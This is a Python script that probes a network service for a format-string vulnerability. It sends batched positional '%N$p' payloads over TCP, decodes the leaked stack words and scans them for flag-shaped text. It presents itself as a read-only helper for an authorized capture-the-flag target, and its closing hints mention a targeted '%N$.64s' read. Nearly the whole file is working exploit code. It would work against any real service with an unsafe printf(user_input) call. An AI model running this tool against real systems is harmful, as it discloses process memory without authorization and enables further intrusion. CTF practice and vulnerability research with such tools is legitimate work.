#!/usr/bin/env python3
"""Probe positional printf pointer disclosures on an authorized CTF target.

This sends bounded, read-only %N$p probes. It does not use %s or %n.
"""

import argparse
import re
import socket
import sys

MARKER = "AAAA"
POINTER_RE = re.compile(r"0x[0-9a-fA-F]+|\(nil\)")
FLAG_SHAPE_RE = re.compile(r"[A-Za-z0-9_]{1,32}\{[^{}\r\n]{1,100}\}")
COMMON_STARTS = (4, 6, 7, 8, 9, 10, 11, 12, 16, 20, 32, 36, 40, 50, 64, 100)
PRIORITY_RADIUS = 2
PRIORITY_WINDOW = 16


def make_batches(positions: list[int], max_input: int) -> list[list[int]]:
    batches: list[list[int]] = []
    current: list[int] = []

    for position in positions:
        candidate = current + [position]
        payload = MARKER + "|" + "|".join(f"%{item}$p" for item in candidate)
        if len(payload) > max_input:
            if not current:
                raise ValueError(
                    f"Input limit {max_input} is too small for a positional probe."
                )
            batches.append(current)
            current = [position]
        else:
            current = candidate

    if current:
        batches.append(current)
    return batches


def receive_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError(
                "The service closed before the prompt arrived; "
                "try --prompt '' if it does not display a prompt."
            )
        data.extend(chunk)
    return bytes(data)


def query(
    host: str, port: int, prompt: bytes, payload: str, timeout: float
) -> bytes:
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        initial = receive_until(sock, prompt) if prompt else b""
        sock.sendall(payload.encode("ascii") + b"\n")

        response = bytearray(initial)
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            response.extend(chunk)
    return bytes(response)


def parse_values(response: bytes, positions: list[int]) -> list[tuple[int, str]]:
    text = response.decode("utf-8", errors="replace")
    marker_index = text.rfind(MARKER)
    if marker_index < 0:
        return []

    tail = text[marker_index + len(MARKER) :]
    tokens = POINTER_RE.findall(tail)[: len(positions)]
    return list(zip(positions, tokens))


def choose_word_size(values: dict[int, str], requested: str) -> int:
    if requested != "auto":
        return int(requested)

    largest = max(
        (
            int(value, 16)
            for value in values.values()
            if value != "(nil)"
        ),
        default=0,
    )
    return 8 if largest > 0xFFFFFFFF else 4


def decode_values(
    values: dict[int, str], word_size: int, byte_order: str
) -> dict[int, bytes]:
    decoded: dict[int, bytes] = {}

    for position, value in values.items():
        number = 0 if value == "(nil)" else int(value, 16)
        try:
            decoded[position] = number.to_bytes(word_size, byte_order)
        except OverflowError:
            print(
                f"  {position:>3}: {value} (does not fit a {word_size}-byte word)",
                file=sys.stderr,
            )
    return decoded


def contiguous_runs(decoded: dict[int, bytes]) -> list[list[tuple[int, bytes]]]:
    runs: list[list[tuple[int, bytes]]] = []
    current: list[tuple[int, bytes]] = []

    for position, word in sorted(decoded.items()):
        if current and position != current[-1][0] + 1:
            runs.append(current)
            current = []
        current.append((position, word))

    if current:
        runs.append(current)
    return runs


def printable_flag_matches(raw: bytes) -> list[str]:
    text = "".join(chr(byte) if 32 <= byte < 127 else "." for byte in raw)
    return [
        match.group()
        for match in FLAG_SHAPE_RE.finditer(text)
        if all(32 <= byte < 127 for byte in raw[match.start() : match.end()])
    ]


def find_flag_shapes(
    values: dict[int, str], word_size: int, byte_order: str
) -> list[str]:
    decoded = decode_values(values, word_size, byte_order)
    matches: list[str] = []
    for run in contiguous_runs(decoded):
        raw = b"".join(word for _, word in run)
        matches.extend(printable_flag_matches(raw))
    return matches


def show_values(
    values: dict[int, str], word_size: int, byte_order: str
) -> list[str]:
    decoded = decode_values(values, word_size, byte_order)

    for position, value in sorted(values.items()):
        word = decoded.get(position)
        if word is None:
            continue
        visible = "".join(chr(byte) if 32 <= byte < 127 else "." for byte in word)
        print(f"  {position:>3}: {value:<18} {visible}")

    matches: list[str] = []
    for run in contiguous_runs(decoded):
        raw = b"".join(word for _, word in run)
        ascii_view = "".join(chr(byte) if 32 <= byte < 127 else "." for byte in raw)
        print(f"ASCII slots {run[0][0]}-{run[-1][0]}: {ascii_view}")
        matches.extend(printable_flag_matches(raw))
    for match in matches:
        print(f"Possible flag-shaped text: {match}")
    return matches


def prioritized_positions(start: int, end: int) -> list[int]:
    positions: set[int] = set()
    for anchor in COMMON_STARTS:
        for candidate_start in range(
            anchor - PRIORITY_RADIUS, anchor + PRIORITY_RADIUS + 1
        ):
            positions.update(
                position
                for position in range(candidate_start, candidate_start + PRIORITY_WINDOW)
                if start <= position <= end
            )
    return sorted(positions)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", help="Authorized challenge host")
    parser.add_argument("port", type=int, help="Authorized challenge TCP port")
    parser.add_argument(
        "--prompt",
        default=">> ",
        help="Prompt suffix to wait for before sending input (default: %(default)r)",
    )
    parser.add_argument(
        "--start", type=int, default=1, help="First positional slot (default: 1)"
    )
    parser.add_argument(
        "--end",
        type=int,
        help="Last positional slot (default: 32, or 128 with --iterative)",
    )
    parser.add_argument(
        "--iterative",
        action="store_true",
        help=(
            "Probe windows around common starting slots first, then scan "
            "untested slots if no flag-shaped text is found"
        ),
    )
    parser.add_argument(
        "--max-input",
        type=int,
        default=127,
        help="Maximum format-string bytes accepted by the target (default: 127)",
    )
    parser.add_argument(
        "--word-size",
        choices=("auto", "4", "8"),
        default="auto",
        help="Bytes per leaked word; auto infers 32- vs 64-bit from pointer values",
    )
    parser.add_argument(
        "--byte-order",
        choices=("little", "big"),
        default="little",
        help="Byte order for rendering leaked words (default: little)",
    )
    parser.add_argument(
        "--timeout", type=float, default=5.0, help="Socket timeout in seconds"
    )
    args = parser.parse_args()

    if not 1 <= args.port <= 65535:
        parser.error("port must be between 1 and 65535")
    end = args.end if args.end is not None else (128 if args.iterative else 32)
    if args.start < 1 or end < args.start:
        parser.error("require 1 <= start <= end")
    if args.max_input < len(MARKER) + 5:
        parser.error("--max-input is too small for even one probe")
    if args.timeout <= 0:
        parser.error("--timeout must be positive")

    prompt = args.prompt.encode("utf-8")
    all_values: dict[int, str] = {}

    def run_phase(positions: list[int], phase: str, stop_on_match: bool) -> bool:
        try:
            batches = make_batches(positions, args.max_input)
        except ValueError as error:
            print(f"Could not build probes: {error}", file=sys.stderr)
            return False

        for batch_number, batch in enumerate(batches, start=1):
            payload = MARKER + "|" + "|".join(f"%{position}$p" for position in batch)
            print(
                f"\n{phase}: probe {batch_number}/{len(batches)} "
                f"(slots {batch[0]}-{batch[-1]}, {len(payload)} bytes)"
            )
            try:
                response = query(
                    args.host, args.port, prompt, payload, args.timeout
                )
            except (OSError, ConnectionError) as error:
                print(f"Connection/probe failed: {error}", file=sys.stderr)
                raise

            print(response.decode("utf-8", errors="replace"), end="")
            values = parse_values(response, batch)
            if not values:
                print("Could not parse pointer values after the marker.")
                continue
            all_values.update(values)

            word_size = choose_word_size(all_values, args.word_size)
            if stop_on_match and find_flag_shapes(
                all_values, word_size, args.byte_order
            ):
                print("Flag-shaped text found; stopping the iterative scan.")
                return True
        return False

    try:
        if args.iterative:
            priority = prioritized_positions(args.start, end)
            print(
                f"Priority pass: probing {len(priority)} slots around "
                f"common offsets {COMMON_STARTS} (±{PRIORITY_RADIUS}, "
                f"{PRIORITY_WINDOW}-word windows)."
            )
            found = run_phase(priority, "Priority", stop_on_match=True)
            if not found:
                priority_set = set(priority)
                remaining = [
                    position
                    for position in range(args.start, end + 1)
                    if position not in priority_set
                ]
                print(
                    f"\nNo flag-shaped text found in the priority pass; "
                    f"scanning the {len(remaining)} remaining slots."
                )
                run_phase(remaining, "Fallback", stop_on_match=True)
        else:
            run_phase(
                list(range(args.start, end + 1)),
                "Scan",
                stop_on_match=False,
            )
    except (OSError, ConnectionError):
        return 2

    if not all_values:
        print("No pointer values were parsed.")
        return 1

    word_size = choose_word_size(all_values, args.word_size)
    print(f"\nDecoded words ({word_size}-byte, {args.byte_order}-endian):")
    matches = show_values(all_values, word_size, args.byte_order)

    if not matches:
        print(
            "\nNo flag-shaped printable string was found. Next steps:\n"
            "- Confirm the input reaches an unsafe printf(user_input) call and "
            "that the service prompt is correct.\n"
            "- Increase --end in modest steps or use --iterative; the useful "
            "slot varies with architecture, compiler, and calling convention.\n"
            "- Set --word-size 4 or 8 and --byte-order explicitly if auto "
            "rendering looks wrong.\n"
            "- If a slot is a verified pointer to the flag buffer, test a "
            "targeted %N$.64s manually; it dereferences memory and can crash.\n"
            "- This helper only probes positional %p disclosures. It does not "
            "try write specifiers such as %n."
        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
